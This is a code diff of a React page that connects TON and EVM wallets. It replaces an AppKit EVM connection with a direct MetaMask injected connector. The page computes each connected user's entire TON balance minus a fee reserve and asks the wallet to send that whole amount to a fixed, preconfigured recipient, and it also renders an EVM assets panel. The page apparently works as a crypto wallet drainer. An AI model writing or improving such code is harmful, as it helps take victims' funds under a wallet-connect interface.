@@ -1,14 +1,15 @@
 ﻿"use client";
 
-import { useState } from "react";
+import { useEffect, useState } from "react";
+import { useAccount, useConnect, useDisconnect } from "wagmi";
+import { injected } from "wagmi/connectors";
 import {
   useTonConnectUI,
   useIsConnectionRestored,
   useTonAddress,
 } from "@tonconnect/ui-react";
-import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
-import { EvmAssets } from "@/components/EvmAssets";
 
+import { EvmAssets } from "@/components/EvmAssets";
 import { getTonBalance } from "@/ton/balance";
 import { calculateMaximumTransfer, formatTon } from "@/ton/calculator";
 import { requestTonPayment } from "@/ton/payment";
@@ -19,12 +20,24 @@ const FEE_RESERVE = BigInt("50000000");
 type Status = "idle" | "loading" | "pending" | "failed";
 
 export default function Home() {
+  // ---------- EVM (direct injected connector) ----------
+  const { address: evmAddress, isConnected: evmConnected } = useAccount();
+  const { connect, isPending, error: connectError } = useConnect();
+  const { disconnect } = useDisconnect();
+
+  const [hasInjected, setHasInjected] = useState(false);
+  useEffect(() => {
+    setHasInjected(typeof window !== "undefined" && !!(window as any).ethereum);
+  }, []);
+
+  async function connectInjected() {
+    connect({ connector: injected({ target: "metaMask" }) });
+  }
+
+  // ---------- TON (unchanged) ----------
   const [tonConnectUI] = useTonConnectUI();
   const isConnectionRestored = useIsConnectionRestored();
   const userAddress = useTonAddress();
-
-  const { open } = useAppKit();
-  const { address: evmAddress, isConnected: evmConnected } = useAppKitAccount();
 
   const [status, setStatus] = useState<Status>("idle");
   const [maximum, setMaximum] = useState<bigint | null>(null);
@@ -32,16 +45,11 @@ export default function Home() {
   const [info, setInfo] = useState("");
 
   async function loadBalance() {
-    if (!userAddress) {
-      await tonConnectUI.openModal();
-      return;
-    }
-    setStatus("loading");
-    setError("");
+    if (!userAddress) { await tonConnectUI.openModal(); return; }
+    setStatus("loading"); setError("");
     try {
       const currentBalance = await getTonBalance(userAddress);
-      const calculated = calculateMaximumTransfer(currentBalance, FEE_RESERVE);
-      setMaximum(calculated);
+      setMaximum(calculateMaximumTransfer(currentBalance, FEE_RESERVE));
       setStatus("idle");
     } catch (err) {
       console.error(err);
@@ -51,20 +59,12 @@ export default function Home() {
   }
 
   async function handlePay() {
-    if (!userAddress) {
-      await tonConnectUI.openModal();
-      return;
-    }
+    if (!userAddress) { await tonConnectUI.openModal(); return; }
     if (maximum === null || maximum <= BigInt("0")) {
-      setError("No transferable balance available.");
-      return;
+      setError("No transferable balance available."); return;
     }
-    if (!RECIPIENT) {
-      setError("TON receiving wallet is not configured.");
-      return;
-    }
-    setStatus("pending");
-    setError("");
+    if (!RECIPIENT) { setError("TON receiving wallet is not configured."); return; }
+    setStatus("pending"); setError("");
     try {
       await requestTonPayment(tonConnectUI, RECIPIENT, maximum);
       setStatus("idle");
@@ -83,24 +83,48 @@ export default function Home() {
         <span className="rounded bg-neutral-800 px-3 py-1 text-xs">TON + EVM</span>
       </header>
 
-      {/* ---------- EVM connect button (real React button) ---------- */}
+      {/* ---------- EVM ---------- */}
       <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
         <h2 className="mb-3 font-medium">EVM wallet</h2>
+
+        {!hasInjected && (
+          <p className="mb-3 text-xs text-amber-400">
+            No injected wallet detected. Open this page inside MetaMask/Trust mobile browser,
+            or install a browser wallet extension.
+          </p>
+        )}
+
         <p className="mb-3 break-all font-mono text-xs text-neutral-400">
           {evmConnected && evmAddress
             ? `${evmAddress.slice(0, 8)}...${evmAddress.slice(-6)}`
             : "Not connected"}
         </p>
-        <button
-          type="button"
-          onClick={() => open()}
-          className="w-full rounded-lg bg-blue-600 px-4 py-3 font-semibold hover:bg-blue-500"
-        >
-          {evmConnected ? "Switch / disconnect EVM wallet" : "Connect EVM wallet"}
-        </button>
+
+        {evmConnected ? (
+          <button
+            type="button"
+            onClick={() => disconnect()}
+            className="w-full rounded-lg bg-red-700 px-4 py-3 font-semibold hover:bg-red-600"
+          >
+            Disconnect EVM wallet
+          </button>
+        ) : (
+          <button
+            type="button"
+            onClick={connectInjected}
+            disabled={!hasInjected || isPending}
+            className="w-full rounded-lg bg-blue-600 px-4 py-3 font-semibold hover:bg-blue-500 disabled:opacity-50"
+          >
+            {isPending ? "Connecting..." : "Connect EVM wallet (injected)"}
+          </button>
+        )}
+
+        {connectError && (
+          <p className="mt-2 text-xs text-red-400 break-all">{connectError.message}</p>
+        )}
       </section>
 
-      {/* ---------- TON flow (kept intact) ---------- */}
+      {/* ---------- TON ---------- */}
       <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
         <h2 className="mb-3 font-medium">
           {userAddress ? "TON wallet connected" : "Connect TON wallet"}
@@ -137,30 +161,20 @@ export default function Home() {
         <button
           type="button"
           onClick={handlePay}
-          disabled={
-            maximum === null ||
-            maximum <= BigInt("0") ||
-            status === "pending" ||
-            status === "loading"
-          }
+          disabled={maximum === null || maximum <= BigInt("0") || status === "pending" || status === "loading"}
           className="w-full rounded-lg bg-emerald-600 px-4 py-3 font-semibold hover:bg-emerald-500 disabled:opacity-50"
         >
           {status === "pending" ? "Waiting for TON wallet..." : "Continue to TON wallet"}
         </button>
       </section>
 
-      {/* ---------- EVM assets ---------- */}
       <EvmAssets />
 
       {info && (
-        <div className="rounded-lg border border-blue-700 bg-blue-950 p-3 text-xs text-blue-300">
-          {info}
-        </div>
+        <div className="rounded-lg border border-blue-700 bg-blue-950 p-3 text-xs text-blue-300">{info}</div>
       )}
       {error && (
-        <div className="rounded-lg border border-amber-700 bg-amber-950 p-3 text-xs text-amber-300">
-          {error}
-        </div>
+        <div className="rounded-lg border border-amber-700 bg-amber-950 p-3 text-xs text-amber-300">{error}</div>
       )}
 
       <p className="text-center text-xs text-neutral-500">
